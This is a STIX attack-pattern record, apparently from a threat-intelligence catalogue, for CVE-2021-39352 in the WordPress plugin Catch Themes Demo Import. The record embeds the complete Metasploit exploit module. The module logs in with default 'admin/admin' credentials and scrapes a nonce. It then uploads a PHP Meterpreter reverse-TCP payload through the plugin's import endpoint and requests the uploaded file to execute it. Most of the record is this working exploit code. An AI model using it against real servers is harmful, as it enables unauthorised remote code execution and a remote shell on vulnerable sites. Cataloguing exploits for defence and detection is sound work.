{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e6479c5-05cd-4311-afb2-3026b348dbdf",
    "created": "2024-08-14T17:08:49.075654Z",
    "modified": "2024-08-14T17:08:49.075658Z",
    "name": "Wordpress Plugin Catch Themes Demo Import RCE",
    "description": " The Wordpress Plugin Catch Themes Demo Import versions < 1.8 are vulnerable to authenticated arbitrary file uploads via the import functionality found in the ~/inc/CatchThemesDemoImport.php file, due to insufficient file type validation. Re-exploitation may need a reboot of the server, or to wait an arbitrary timeout. During testing this timeout was roughly 5min.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_catch_themes_demo_import.rb",
            "external_id": "wp_catch_themes_demo_import.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-39352"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2617555/catch-themes-demo-import/trunk/inc/CatchThemesDemoImport.php"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/vulnerability-advisories/#CVE-2021-39352"
        },
        {
            "source_name": "WPVDB",
            "external_id": "781f2ff4-cb94-40d7-96cb-90128daed862"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Plugin Catch Themes Demo Import RCE',\n        'Description' => %q{\n          The Wordpress Plugin Catch Themes Demo Import versions < 1.8 are vulnerable to authenticated\n          arbitrary file uploads via the import functionality found in the\n          ~/inc/CatchThemesDemoImport.php file, due to insufficient file type validation.\n          Re-exploitation may need a reboot of the server, or to wait an arbitrary timeout.\n          During testing this timeout was roughly 5min.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Ron Jost', # edb\n          'Thinkland Security Team' # listed on wordfence's site\n        ],\n        'References' => [\n          [ 'EDB', '50580' ],\n          [ 'CVE', '2021-39352' ],\n          [ 'URL', 'https://plugins.trac.wordpress.org/changeset/2617555/catch-themes-demo-import/trunk/inc/CatchThemesDemoImport.php' ],\n          [ 'URL', 'https://www.wordfence.com/vulnerability-advisories/#CVE-2021-39352' ],\n          [ 'WPVDB', '781f2ff4-cb94-40d7-96cb-90128daed862' ]\n        ],\n        'Platform' => ['php'],\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        # we leave this out as typically php.ini will bail before 350mb, and payloads are small enough to fit as is.\n        # 'Payload'        =>\n        # {\n        #   # https://plugins.trac.wordpress.org/browser/catch-themes-demo-import/tags/1.6.1/inc/CatchThemesDemoImport.php#L226\n        #   'Space' => 367_001_600, # 350mb\n        # }\n        'DisclosureDate' => '2021-10-21',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          # https://support.shufflehound.com/forums/topic/i-cant-use-the-one-click-demo-installer/#post-31770\n          # re-exploitation may need a reboot of the server, or to wait an arbitrary timeout.\n          'Reliability' => [ UNRELIABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username of the account', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password of the account', 'admin']),\n      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/']),\n    ]\n  end\n\n  def check\n    return CheckCode::Safe('Wordpress not detected.') unless wordpress_and_online?\n\n    checkcode = check_plugin_version_from_readme('catch-themes-demo-import', '1.8')\n    if checkcode == CheckCode::Safe\n      print_error('catch-themes-demo-import not a vulnerable version')\n    end\n    checkcode\n  end\n\n  def exploit\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n\n    if cookie.nil?\n      vprint_error('Invalid login, check credentials')\n      return\n    end\n\n    # grab the ajax_nonce\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'themes.php'),\n      'method' => 'GET',\n      'cookie' => cookie,\n      'keep_cookies' => 'false', # for some reason wordpress gives back an unauth cookie here, so ignore it.\n      'vars_get' => {\n        'page' => 'catch-themes-demo-import'\n      }\n    })\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve page') unless res.code == 200\n    /\"ajax_nonce\":\"(?<ajax_nonce>[a-z0-9]{10})\"/ =~ res.body\n    fail_with(Failure::UnexpectedReply, 'Unable to find ajax_nonce on page') unless ajax_nonce\n    vprint_status(\"Ajax Nonce: #{ajax_nonce}\")\n\n    random_filename = \"#{rand_text_alphanumeric(6..12)}.php\"\n    vprint_status(\"Uploading payload filename: #{random_filename}\")\n\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part('ctdi_import_demo_data', nil, nil, 'form-data; name=\"action\"')\n    multipart_form.add_part(ajax_nonce, nil, nil, 'form-data; name=\"security\"')\n    multipart_form.add_part('undefined', nil, nil, 'form-data; name=\"selected\"')\n    multipart_form.add_part(\n      payload.encoded,\n      'application/x-php',\n      nil,\n      \"form-data; name=\\\"content_file\\\"; filename=\\\"#{random_filename}\\\"\"\n    )\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'keep_cookies' => true,\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'data' => multipart_form.to_s\n    )\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    fail_with(Failure::UnexpectedReply, 'Plugin not ready to process new payloads. Please retry in a few minutes.') if res.code == 200 && res.body.include?('afterAllImportAJAX')\n    fail_with(Failure::UnexpectedReply, 'Failed to upload payload') unless res.code == 500\n    # yes, a 500. We uploaded a malformed item, so when it tries to import it, it fails.  This\n    # is actually positive as it won't display a malformed item anywhere in the UI.  Simply writes our payload, then exits (non-gracefully)\n    #\n    # [Fri Dec 24 16:48:00.904980 2021] [php7:error] [pid 440128] [client 192.168.2.199:38107] PHP Fatal error:  Uncaught Error: Class 'XMLReader' not found in /var/www/wordpress/wp-content/plugins/catch-themes-demo-import/vendor/catchthemes/wp-content-importer-v2/src/WXRImporter.php:123\n    # Stack trace:\n    # #0 /var/www/wordpress/wp-content/plugins/catch-themes-demo-import/vendor/catchthemes/wp-content-importer-v2/src/WXRImporter.php(331): CatchThemes\\\\WPContentImporter2\\\\WXRImporter->get_reader()\n    # #1 /var/www/wordpress/wp-content/plugins/catch-themes-demo-import/inc/Importer.php(80): CatchThemes\\\\WPContentImporter2\\\\WXRImporter->import()\n    # #2 /var/www/wordpress/wp-content/plugins/catch-themes-demo-import/inc/Importer.php(137): CTDI\\\\Importer->import()\n    # #3 /var/www/wordpress/wp-content/plugins/catch-themes-demo-import/inc/CatchThemesDemoImport.php(306): CTDI\\\\Importer->import_content()\n    # #4 /var/www/wordpress/wp-includes/class-wp-hook.php(292): CTDI\\\\CatchThemesDemoImport->import_demo_data_ajax_callback()\n    # #5 /var/www/wordpress/wp-includes/class-wp-hook.php(316): WP_Hook->apply_filters()\n    # #6 /var/www/wordpress/wp-includes/plugin.php(484): WP_ in /var/www/wordpress/wp-content/plugins/catch-themes-demo-import/vendor/catchthemes/wp-content-importer-v2/src/WXRImporter.php on line 123\n    register_file_for_cleanup(random_filename)\n    month = Date.today.month.to_s.rjust(2, '0')\n    print_status(\"Triggering payload at wp-content/uploads/#{Date.today.year}/#{month}/#{random_filename}\")\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'uploads', Date.today.year, month, random_filename),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-10-21",
    "x_mitre_platforms": [
        "['php']"
    ]
}